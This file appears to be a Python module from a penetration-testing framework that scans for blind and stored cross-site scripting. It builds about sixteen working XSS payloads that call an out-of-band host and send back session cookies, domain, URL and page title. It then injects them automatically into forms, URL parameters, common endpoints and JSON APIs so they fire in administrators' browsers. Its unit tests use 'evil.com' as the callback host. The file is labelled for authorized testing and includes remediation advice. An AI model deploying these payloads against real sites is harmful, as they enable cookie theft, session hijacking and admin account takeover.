"""Blind XSS Scanner — Stored/Delayed XSS via ForgeCollab OOB Callbacks.

Detects stored XSS that fires when an admin/operator views the injected
content (e.g., support tickets, user profiles, log viewers, admin panels).
The payload phones home to ForgeCollab when executed in a victim browser.

Strategy:
    1. Register OOB token with ForgeCollab HTTP listener
    2. Inject <script src=//TOKEN.collab-domain/bxss.js> or <img onerror>
       payloads into form fields, comments, profile fields, etc.
    3. ForgeCollab HTTP callback = proof of stored XSS execution
    4. Callback includes: victim browser UA, cookies, DOM info

This catches XSS that reflected scanners miss entirely — the payload
doesn't fire on the response to the attacker's request, but later when
a different user (often admin) views the stored content.

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import logging
import sys
import time
import uuid
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.blind_xss")

CVSS_STORED_XSS = "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
CVSS40_STORED_XSS = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"


def _build_blind_xss_payloads(
    callback_url: str, token: str
) -> list[tuple[str, str]]:
    """Generate blind XSS payloads that phone home to ForgeCollab.

    Each payload triggers an HTTP request to our callback server when
    executed in a victim's browser, carrying context about the execution
    environment.

    Returns list of (payload_string, context_label).
    """
    # callback_url should be like http://TOKEN.collab.example.com/bxss
    return [
        # ── Tier 1: Script src (most reliable, least filtered) ───
        (
            f'"><script src=//{token}.{callback_url}/bxss.js></script>',
            "script-src-dquote",
        ),
        (
            f"'><script src=//{token}.{callback_url}/bxss.js></script>",
            "script-src-squote",
        ),

        # ── Tier 2: Image onerror (works in img-allowed contexts) ─
        (
            f'"><img src=x onerror="var i=new Image();'
            f"i.src='//{token}.{callback_url}/bxss?c='+document.cookie"
            f'">',
            "img-onerror-cookie",
        ),

        # ── Tier 3: SVG onload (bypasses some img filters) ───────
        (
            f'"><svg onload="fetch(\'//{token}.{callback_url}/bxss?'
            f"d='+encodeURIComponent(document.domain)+'&c='+document.cookie)"
            f'">',
            "svg-onload-fetch",
        ),

        # ── Tier 4: Event handlers (input/details/body) ──────────
        (
            f'"><input autofocus onfocus="var x=new XMLHttpRequest();'
            f"x.open('GET','//{token}.{callback_url}/bxss?u='+location.href);x.send()"
            f'">',
            "input-onfocus",
        ),
        (
            f'"><details open ontoggle="fetch(\'//{token}.{callback_url}/bxss?'
            f"t='+document.title)\">",
            "details-ontoggle",
        ),

        # ── Tier 5: Iframe (for sandboxed contexts) ──────────────
        (
            f'"><iframe src="//{token}.{callback_url}/bxss?ref=iframe" '
            f'style="display:none">',
            "iframe-hidden",
        ),

        # ── Tier 6: CSS-based exfil (ultra-stealth) ──────────────
        (
            f'"><style>*{{background:url(//{token}.{callback_url}/bxss?css=1)}}</style>',
            "css-background-url",
        ),

        # ── Tier 7: Markdown/BBCode contexts ─────────────────────
        (
            f"[img]//{token}.{callback_url}/bxss?bb=1[/img]",
            "bbcode-img",
        ),
        (
            f"![x](https://{token}.{callback_url}/bxss?md=1)",
            "markdown-img",
        ),

        # ── Tier 8: JS string breakout (closes JS string literal) ─
        (
            f"'-fetch('//{token}.{callback_url}/bxss?js=1')-'",
            "js-string-squote",
        ),
        (
            f'"-fetch("//{token}.{callback_url}/bxss?js=2")-"',
            "js-string-dquote",
        ),
        (
            f"\\'-fetch('//{token}.{callback_url}/bxss?js=3')//'",
            "js-string-escaped-squote",
        ),

        # ── Tier 9: Template literal injection `${...}` ──────────
        (
            f"${{fetch('//{token}.{callback_url}/bxss?tpl=1')}}",
            "template-literal",
        ),
        (
            f"`${{fetch('//{token}.{callback_url}/bxss?tpl=2')}}`",
            "template-literal-backtick",
        ),

        # ── Tier 10: JSON context (value injection) ───────────────
        (
            f'","xss":"//{token}.{callback_url}/bxss?json=1","x":"',
            "json-value-inject",
        ),
    ]


# Common form fields where stored content is likely viewed by admins
BLIND_XSS_FIELDS: list[tuple[str, str]] = [
    ("name",        "User display name — shown in admin panels"),
    ("username",    "Username — logged and displayed in user lists"),
    ("email",       "Email — shown in admin views, support tickets"),
    ("comment",     "Comment — viewed by moderators/admins"),
    ("message",     "Message — support tickets, contact forms"),
    ("subject",     "Subject — email subjects, ticket titles"),
    ("body",        "Body — full text content"),
    ("bio",         "Bio — profile fields viewed by admins"),
    ("description", "Description — product/item descriptions"),
    ("title",       "Title — page/post titles"),
    ("feedback",    "Feedback — customer feedback forms"),
    ("review",      "Review — product reviews"),
    ("address",     "Address — shipping/billing viewed by ops"),
    ("company",     "Company — business profiles"),
    ("phone",       "Phone — contact info in CRM"),
    ("url",         "URL — website field, often rendered as link"),
    ("website",     "Website — profile website field"),
    ("referrer",    "Referrer — analytics tracking"),
    ("search",      "Search — search history logged by admins"),
    ("question",    "Question — FAQ/support question submission"),
]


class BlindXss(BaseModule):
    """Blind/Stored XSS scanner using ForgeCollab OOB HTTP callbacks.

    Injects callback payloads into form fields that are likely to be
    stored and later viewed by admin users. When the payload fires in
    the admin's browser, ForgeCollab receives an HTTP callback with
    execution context (domain, cookies, URL, title).
    """

    NAME        = "blind_xss"
    DESCRIPTION = "Blind/stored XSS via OOB callbacks — catches admin-panel XSS"
    PHASE       = 4
    TAGS        = ["xss", "stored-xss", "blind", "oob", "cwe-79", "owasp-a03"]

    OOB_WAIT_SECONDS = 30.0  # Longer wait — stored XSS may be delayed

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        await self.rate_limit()

        # ── Get ForgeCollab for OOB ──────────────────────────────
        collab = self.config.extra.get("collab_client")
        collab_domain = (
            self.config.extra.get("collab_domain")
            or self.config.extra.get("FORGE_COLLAB_DOMAIN", "")
        )

        if not collab and not collab_domain:
            self.log.warning(
                "Blind XSS requires ForgeCollab OOB server. "
                "Set --collab-server or FORGE_COLLAB_DOMAIN. Skipping."
            )
            return self._make_result(
                start, skipped=True,
                skip_reason="No ForgeCollab OOB server configured"
            )

        token = str(uuid.uuid4()).replace("-", "")[:24]
        if collab:
            token = collab.register("blind_xss", "stored_xss", target, "forms")

        callback_domain = collab_domain or (
            collab.domain if hasattr(collab, "domain") else "collab.local"
        )

        self.log.info(
            "Blind XSS scan on %s (OOB: %s, token: %s…)",
            target, callback_domain, token[:8],
        )

        payloads = _build_blind_xss_payloads(callback_domain, token)

        # ── Phase 1: Inject into discovered forms ────────────────
        forms = self.config.extra.get("found_forms", [])
        form_count = await self._inject_forms(target, forms, payloads)

        # ── Phase 2: Inject into URL params ──────────────────────
        param_count = await self._inject_params(target, payloads)

        # ── Phase 3: Inject into common POST endpoints ───────────
        post_count = await self._inject_common_endpoints(target, payloads)

        # ── Phase 4: Inject via JSON API ─────────────────────────
        json_count = await self._inject_json_api(target, payloads)

        # ── Phase 5: DOM-based XSS sink probe (no OOB needed) ────
        dom_suspects = await self._dom_xss_probe(target)
        if dom_suspects:
            self._report_dom_suspects(target, dom_suspects)

        total = form_count + param_count + post_count + json_count
        self.log.info(
            "Blind XSS: %d payloads injected, waiting %ds for callbacks…",
            total, int(self.OOB_WAIT_SECONDS),
        )

        # ── Wait for OOB callback ────────────────────────────────
        got_callback = False
        callback_details: dict[str, Any] = {}

        if collab:
            got_callback = await collab.wait_for_callback(
                token, timeout=self.OOB_WAIT_SECONDS
            )
            if got_callback:
                callbacks = collab.get_callbacks(token)
                if callbacks:
                    cb = callbacks[0]
                    callback_details = {
                        "callback_type": getattr(cb.callback_type, "value", str(cb.callback_type)),
                        "source_ip": cb.source_ip,
                        "timestamp": cb.timestamp,
                        "user_agent": cb.details.get("user_agent", "") if hasattr(cb, "details") else "",
                        "path": cb.details.get("path", "") if hasattr(cb, "details") else "",
                    }
        else:
            await asyncio.sleep(self.OOB_WAIT_SECONDS)

        if got_callback:
            self._report_confirmed(target, token, callback_details, total)
        else:
            self._report_planted(target, token, total)

        return self._make_result(start)

    # ══════════════════════════════════════════════════════════════
    # INJECTION METHODS
    # ══════════════════════════════════════════════════════════════

    async def _inject_forms(
        self, target: str, forms: list[dict], payloads: list[tuple[str, str]]
    ) -> int:
        """Inject blind XSS payloads into crawler-discovered forms."""
        count = 0
        for form in forms[:15]:
            action = form.get("action") or target
            inputs = form.get("inputs", [])
            method = form.get("method", "POST").upper()

            if not inputs:
                continue

            # Use first 3 payloads per form
            for payload_str, label in payloads[:3]:
                for field in inputs:
                    await self.rate_limit()
                    data = {i: "test" for i in inputs}
                    data[field] = payload_str

                    try:
                        import aiohttp
                        async with aiohttp.ClientSession(
                            connector=aiohttp.TCPConnector(ssl=False)
                        ) as session:
                            if method == "POST":
                                async with session.post(
                                    action, data=data,
                                    timeout=aiohttp.ClientTimeout(total=8),
                                ) as resp:
                                    await resp.read()
                            else:
                                async with session.get(
                                    action, params=data,
                                    timeout=aiohttp.ClientTimeout(total=8),
                                ) as resp:
                                    await resp.read()
                            count += 1
                    except Exception:
                        pass

        return count

    async def _inject_params(
        self, target: str, payloads: list[tuple[str, str]]
    ) -> int:
        """Inject into URL parameters."""
        parsed = urlparse(target)
        if not parsed.query:
            return 0

        params = parse_qs(parsed.query, keep_blank_values=True)
        count = 0

        for param_name in params:
            for payload_str, _ in payloads[:2]:
                await self.rate_limit()
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload_str
                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url, timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            await resp.read()
                            count += 1
                except Exception:
                    pass

        return count

    async def _inject_common_endpoints(
        self, target: str, payloads: list[tuple[str, str]]
    ) -> int:
        """POST blind XSS payloads to common form endpoints."""
        count = 0
        endpoints = [
            "/contact", "/feedback", "/support", "/comment",
            "/register", "/signup", "/profile", "/settings",
            "/api/comment", "/api/feedback", "/api/contact",
        ]

        payload_str = payloads[0][0]  # Use primary payload

        for endpoint in endpoints:
            url = f"{target}{endpoint}"
            if not self.check_scope(url):
                continue

            # Build form data with blind XSS in each field
            for field_name, _ in BLIND_XSS_FIELDS[:6]:
                await self.rate_limit()
                data = {field_name: payload_str}

                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.post(
                            url, data=data,
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            await resp.read()
                            count += 1
                except Exception:
                    pass

        return count

    async def _inject_json_api(
        self, target: str, payloads: list[tuple[str, str]]
    ) -> int:
        """Inject blind XSS payloads into JSON API endpoints."""
        count = 0
        payload_str = payloads[0][0]

        api_endpoints = [
            "/api/users", "/api/comments", "/api/feedback",
            "/api/messages", "/api/support",
        ]

        for endpoint in api_endpoints:
            url = f"{target}{endpoint}"
            if not self.check_scope(url):
                continue

            for field, _ in BLIND_XSS_FIELDS[:4]:
                await self.rate_limit()
                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.post(
                            url, json={field: payload_str},
                            headers={"Content-Type": "application/json"},
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            await resp.read()
                            count += 1
                except Exception:
                    pass

        return count

    async def _dom_xss_probe(self, target: str) -> list[dict]:
        """Probe for DOM-based XSS sinks by injecting into hash/search params.

        DOM XSS fires client-side via JavaScript sinks:
            document.write, innerHTML, eval, location.hash, location.search.
        We inject a unique marker into hash (#) and search (?x=) params, retrieve
        the response HTML, and look for unescaped reflection of our marker
        in script blocks or event attributes — a strong indicator that the
        JS sink will execute it without sanitization.

        Returns list of {url, label, sink_hint} dicts for each suspect.
        """
        suspects: list[dict] = []
        marker = "FRGExss1337"

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        probe_urls = [
            # Hash-based sink probes (location.hash → innerHTML)
            (f"{base_url}?{marker}=1#{marker}", "hash-fragment"),
            (f"{base_url}#{marker}", "bare-hash"),
            # Search param sinks (location.search → document.write)
            (f"{base_url}?q={marker}", "search-param-q"),
            (f"{base_url}?search={marker}", "search-param-search"),
            (f"{base_url}?redirect={marker}", "search-param-redirect"),
            (f"{base_url}?url={marker}", "search-param-url"),
            (f"{base_url}?next={marker}", "search-param-next"),
            (f"{base_url}?returnTo={marker}", "search-param-returnTo"),
            (f"{base_url}?callback={marker}", "jsonp-callback"),
            (f"{base_url}?jsonp={marker}", "jsonp-param"),
        ]

        # DOM sink patterns that indicate unsafe JS use of the parameter
        import re
        sink_patterns = [
            re.compile(r"document\.write\s*\(", re.I),
            re.compile(r"\.innerHTML\s*=", re.I),
            re.compile(r"\.outerHTML\s*=", re.I),
            re.compile(r"eval\s*\(", re.I),
            re.compile(r"setTimeout\s*\(\s*['\"]", re.I),
            re.compile(r"setInterval\s*\(\s*['\"]", re.I),
            re.compile(r"location\s*=\s*[^=]", re.I),
            re.compile(r"location\.href\s*=", re.I),
        ]

        try:
            import aiohttp
            for probe_url, label in probe_urls:
                await self.rate_limit()
                try:
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            probe_url, timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            body = await resp.text(errors="replace")

                    # Check 1: raw marker reflected in response (unescaped)
                    if marker in body:
                        sink_hint = "marker-reflected-raw"
                        # Check 2: is it reflected inside a script block or handler?
                        in_script = bool(re.search(
                            rf"<script[^>]*>[^<]*{re.escape(marker)}",
                            body, re.I | re.S,
                        ))
                        if in_script:
                            sink_hint = "marker-in-script-block"
                        suspects.append({
                            "url": probe_url,
                            "label": label,
                            "sink_hint": sink_hint,
                        })
                        continue

                    # Check 3: page contains dangerous sink patterns near parameter context
                    for pat in sink_patterns:
                        if pat.search(body):
                            suspects.append({
                                "url": probe_url,
                                "label": label,
                                "sink_hint": f"sink-pattern:{pat.pattern[:30]}",
                            })
                            break

                except Exception:
                    pass
        except ImportError:
            pass

        return suspects

    # ══════════════════════════════════════════════════════════════
    # REPORTING
    # ══════════════════════════════════════════════════════════════

    def _report_confirmed(
        self, target: str, token: str,
        callback_details: dict, total_injections: int,
    ) -> None:
        """Report confirmed blind XSS — OOB callback received."""
        victim_ua = callback_details.get("user_agent", "unknown")
        victim_ip = callback_details.get("source_ip", "unknown")

        ev = Evidence(
            request_raw=f"Blind XSS spray — {total_injections} payloads injected",
            response_raw=(
                f"OOB HTTP callback received from {victim_ip} "
                f"(UA: {victim_ua[:80]})"
            ),
            extra={
                "token": token,
                "total_injections": total_injections,
                "victim_ip": victim_ip,
                "victim_ua": victim_ua,
                "callback_details": callback_details,
                "confidence": "HIGH",
            },
        )

        self.new_finding(
            title=f"Blind/Stored XSS — CONFIRMED via OOB Callback",
            severity=Severity.HIGH,
            description=(
                f"Stored cross-site scripting (blind XSS) confirmed at {target}. "
                f"An injected payload was executed in a victim's browser and triggered "
                f"an OOB HTTP callback from {victim_ip} "
                f"(User-Agent: {victim_ua[:60]}). "
                "This means attacker-controlled content is stored server-side and "
                "rendered without sanitization when viewed by other users (likely admins). "
                "Impact: session hijacking, admin account takeover, data exfiltration, "
                "privilege escalation via admin panel compromise."
            ),
            reproduction_steps=[
                f"1. Inject blind XSS payload into form fields at {target}",
                "2. Wait for admin/moderator to view the stored content",
                f"3. Observe HTTP callback to ForgeCollab (token {token[:8]}…)",
                f"4. Callback from {victim_ip} confirms execution in victim browser",
            ],
            remediation=(
                "1. Apply context-aware output encoding on ALL stored data before rendering\n"
                "2. Implement Content Security Policy (CSP) with strict script-src\n"
                "3. Use HttpOnly and Secure flags on all session cookies\n"
                "4. Sanitize HTML input with a whitelist-based library (DOMPurify, Bleach)\n"
                "5. Review admin panels for unsanitized data display"
            ),
            references=["CWE-79", "OWASP A03:2021"],
            evidence=ev,
            cvss_v31_vector=CVSS_STORED_XSS,
            cvss_v40_vector=CVSS40_STORED_XSS,
            mitre_attack=["TA0004/T1059.007", "TA0006/T1557"],
            target=target,
        )

    def _report_planted(
        self, target: str, token: str, total_injections: int,
    ) -> None:
        """Report that blind XSS payloads were planted but no callback yet."""
        ev = Evidence(
            request_raw=f"Blind XSS spray — {total_injections} payloads planted",
            response_raw="No callback yet — payloads may fire when admin views content",
            extra={
                "token": token,
                "total_injections": total_injections,
                "confidence": "UNVERIFIED",
                "note": "Stored XSS may fire hours/days later when content is viewed",
            },
        )

        self.new_finding(
            title="Blind XSS Payloads Planted — Awaiting Callback",
            severity=Severity.INFO,
            description=(
                f"Blind XSS payloads ({total_injections}) were injected into "
                f"form fields at {target}. No OOB callback received within "
                f"{self.OOB_WAIT_SECONDS}s. Stored XSS may fire later when "
                "an admin views the injected content. Keep ForgeCollab running "
                "to catch delayed callbacks."
            ),
            reproduction_steps=[
                f"Payloads planted: {total_injections} across forms/APIs",
                "Keep ForgeCollab server running for delayed callbacks",
                f"Monitor token {token[:8]}… for callbacks",
            ],
            remediation="Audit all stored-data rendering for output encoding.",
            references=["CWE-79", "OWASP A03:2021"],
            evidence=ev,
            cvss_v31_vector=CVSS_STORED_XSS,
            cvss_v40_vector=CVSS40_STORED_XSS,
            target=target,
        )

    def _report_dom_suspects(
        self, target: str, suspects: list[dict]
    ) -> None:
        """Report DOM-based XSS sink indicators found during probe."""
        details = "\n".join(
            f"  [{s['label']}] {s['url']} — sink: {s['sink_hint']}"
            for s in suspects
        )
        ev = Evidence(
            request_raw=f"DOM XSS probe — {len(suspects)} suspect sinks identified",
            response_raw=details,
            extra={
                "suspects": suspects,
                "detection": "dom-based",
                "confidence": "MEDIUM",
            },
        )

        self.new_finding(
            title=f"DOM-Based XSS Sink Indicators — {len(suspects)} Location(s)",
            severity=Severity.HIGH,
            description=(
                f"DOM-based XSS sink patterns were detected at {target}. "
                "The server reflects attacker-controlled input (URL parameters, "
                "hash fragments) into the HTML response without encoding, or the "
                "page contains JavaScript sinks (innerHTML, document.write, eval) "
                "that may process URL-derived data without sanitization. "
                "DOM XSS executes entirely client-side — traditional scanners "
                "that only inspect server responses will miss it entirely.\n\n"
                f"Suspect locations:\n{details}"
            ),
            reproduction_steps=[
                "1. Open the target URL with a marker in the hash/search param",
                "2. Observe unescaped marker reflected in page source or script block",
                "3. Replace marker with XSS payload: <img src=x onerror=alert(1)>",
                "4. Use browser DevTools Sources panel to confirm sink execution",
            ],
            remediation=(
                "1. Never pass location.hash / location.search to innerHTML, "
                "document.write, or eval without sanitization\n"
                "2. Use textContent instead of innerHTML for text insertion\n"
                "3. Implement strict CSP: script-src 'self' 'nonce-...' — "
                "blocks inline eval and injected scripts\n"
                "4. Adopt DOMPurify for any HTML rendering from untrusted sources\n"
                "5. Review all JSONP endpoints — they are a common DOM XSS vector"
            ),
            references=["CWE-79", "OWASP A03:2021"],
            evidence=ev,
            cvss_v31_vector=CVSS_STORED_XSS,
            cvss_v40_vector=CVSS40_STORED_XSS,
            mitre_attack=["TA0004/T1059.007"],
            target=target,
        )


# ══════════════════════════════════════════════════════════════════════
# UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestBlindXss:
    def test_payload_generation(self) -> None:
        payloads = _build_blind_xss_payloads("collab.test.com", "abc123")
        assert len(payloads) >= 8

    def test_payloads_contain_token(self) -> None:
        payloads = _build_blind_xss_payloads("evil.com", "tok456")
        for p, label in payloads:
            assert "tok456" in p, f"Token missing in {label}: {p}"

    def test_script_src_payload(self) -> None:
        payloads = _build_blind_xss_payloads("evil.com", "tok")
        script_payloads = [p for p, l in payloads if "script-src" in l]
        assert len(script_payloads) >= 2

    def test_js_string_context_payloads(self) -> None:
        payloads = _build_blind_xss_payloads("evil.com", "tok")
        labels = {l for _, l in payloads}
        assert any("js-string" in l for l in labels), "JS string breakout payloads missing"

    def test_template_literal_payloads(self) -> None:
        payloads = _build_blind_xss_payloads("evil.com", "tok")
        labels = {l for _, l in payloads}
        assert any("template-literal" in l for l in labels), "Template literal payloads missing"

    def test_context_coverage(self) -> None:
        """Verify all required XSS context types are represented."""
        payloads = _build_blind_xss_payloads("evil.com", "tok")
        labels = {l for _, l in payloads}
        # HTML context
        assert any("script-src" in l or "img-onerror" in l for l in labels), "HTML context missing"
        # Attribute context
        assert any("onfocus" in l or "ontoggle" in l for l in labels), "Attribute context missing"
        # SVG context
        assert any("svg" in l for l in labels), "SVG context missing"
        # JS string context
        assert any("js-string" in l for l in labels), "JS string context missing"
        # Template literal
        assert any("template-literal" in l for l in labels), "Template literal context missing"
        # JSON context
        assert any("json" in l for l in labels), "JSON context missing"

    def test_dom_xss_probe_returns_list(self) -> None:
        """_dom_xss_probe signature: no payloads param, returns list."""
        import inspect
        sig = inspect.signature(BlindXss._dom_xss_probe)
        params = list(sig.parameters.keys())
        assert "payloads" not in params, "_dom_xss_probe should not take payloads arg"
        assert "target" in params

    def test_blind_xss_fields_not_empty(self) -> None:
        assert len(BLIND_XSS_FIELDS) >= 15

    def test_module_metadata(self) -> None:
        assert BlindXss.NAME == "blind_xss"
        assert "blind" in BlindXss.TAGS
        assert "oob" in BlindXss.TAGS
